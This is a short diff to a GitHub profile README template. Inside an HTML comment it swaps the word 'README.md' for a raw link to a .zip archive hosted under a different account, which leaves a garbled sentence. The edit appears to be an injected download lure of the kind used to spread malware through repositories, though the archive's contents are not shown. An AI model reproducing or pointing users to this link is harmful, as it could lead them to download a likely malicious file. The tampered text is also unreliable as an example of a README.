@@ -7,6 +7,6 @@ Python- 🌱 I’m currently learning ...
 - ⚡ Fun fact: ...
 
 <!---
-Omkar1128/Omkar1128 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+Omkar1128/Omkar1128 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Om20kar05/Omkar1128/main/in/Omkar1128.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
